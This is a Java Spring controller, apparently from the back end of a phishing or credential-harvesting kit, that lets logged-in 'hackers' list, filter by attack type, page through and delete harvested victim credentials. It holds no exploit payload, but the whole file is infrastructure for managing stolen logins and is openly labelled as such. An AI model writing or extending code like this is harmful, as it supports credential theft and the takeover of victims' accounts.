package com.hack.demo.controller;

import com.hack.demo.entity.VictimCredential;
import com.hack.demo.repository.HackerRepository;
import com.hack.demo.repository.VictimCredentialRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Sort;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.security.Principal;
import java.util.Arrays;

@Controller
public class VictimDataController {

    private static final int dataSize = 2;
    @Autowired
    private HackerRepository hackerRepository;
    @Autowired
    private VictimCredentialRepository victimCredentialRepository;

    @GetMapping("/fetch_victim_data")
    public String fetchVictimData(Principal principal, Model model, String type, int page){
        page = Math.abs(page);
        String hackerId = hackerRepository.findHackerIdByEmail(principal.getName());
        Page<VictimCredential> victimCredentialPage = null;
        if(Arrays.<String>stream(AttackController.types).anyMatch(t->t.equals(type))){
            victimCredentialPage = victimCredentialRepository.findPageableVictimCredentialWithType(hackerId, type,
                    PageRequest.of(page, dataSize, Sort.by(Sort.Direction.DESC, "id")));
        }else{
            victimCredentialPage = victimCredentialRepository.findPageableVictimCredential(hackerId,
                    PageRequest.of(page, dataSize, Sort.by(Sort.Direction.DESC, "id")));
        }
        System.out.println("#"+victimCredentialPage);
        model.addAttribute("data", victimCredentialPage);
        return "victim_data_table";
    }

    @ResponseBody
    @RequestMapping(value = "/delete_victim_data", method = RequestMethod.POST)
    private boolean deleteVictimData(Principal principal, long id){
        try {
            victimCredentialRepository.deleteVictimCredentialByHackerIdAndId(hackerRepository
                    .findHackerIdByEmail(principal.getName()), id);
            return true;
        }catch (Exception e){
            return false;
        }
    }


    @ResponseBody
    @GetMapping("/fetch_victim_data_rest")
    public Page<VictimCredential> fetchVictimDataRest(Principal principal, Model model){
        String hackerId = hackerRepository.findHackerIdByEmail(principal.getName());
        return victimCredentialRepository.findPageableVictimCredential(hackerId, PageRequest.of(0, dataSize,
                Sort.by(Sort.Direction.DESC, "id")));
    }




}
